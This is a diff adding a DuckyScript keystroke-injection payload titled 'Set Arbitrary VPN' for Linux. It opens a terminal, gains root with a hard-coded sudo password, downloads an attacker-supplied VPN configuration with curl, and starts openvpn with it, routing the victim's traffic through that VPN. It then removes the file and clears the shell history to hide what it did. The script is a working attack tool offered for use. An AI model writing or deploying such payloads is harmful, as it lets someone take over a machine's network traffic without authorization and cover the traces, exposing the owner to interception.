@@ -1,0 +1,71 @@
+
+REM ####################################
+REM #                                  |
+REM # Title        : Set Arbitrary VPN |
+REM # Author       : Aleff             |
+REM # Version      : 1.0               |
+REM # Category     : Execution         |
+REM # Target       : Linux             |
+REM #                                  |
+REM ####################################
+
+REM Requirements:
+REM     - Permissions
+REM     - Internet Connection
+REM     - 'openvpn' installed
+
+REM REQUIRED: You need to know the sudo password and replace 'example' with this
+DEFINE SUDO_PASS example
+REM REQUIRED: Set your VPN file configuration replacing example.com with your own link
+DEFINE VPN_FILE_LINK example.com
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### PERMISSIONS SECTION ####
+
+
+STRING sudo su
+ENTER
+DELAY 1000
+STRING SUDO_PASS
+ENTER
+DELAY 1000
+
+
+REM #### VPN SECTION ####
+
+
+STRING curl 
+STRING VPN_FILE_LINK
+STRING  > vpn_configuration.ovpn
+ENTER
+REM It depends by the internet connection
+DELAY 2000
+
+STRING openvpn vpn_configuration.ovpn
+REM It depends by the computer power
+DELAY 2000
+
+
+REM #### REMOVE TRACES ####
+
+
+STRING rm vpn_configuration.ovpn
+ENTER
+DELAY 500
+
+STRING history -c
+ENTER
+DELAY 500
+
+REM Exit from Sudo user
+STRING exit
+ENTER
+DELAY 500
+
+REM Close the shell
+STRING exit
+ENTER
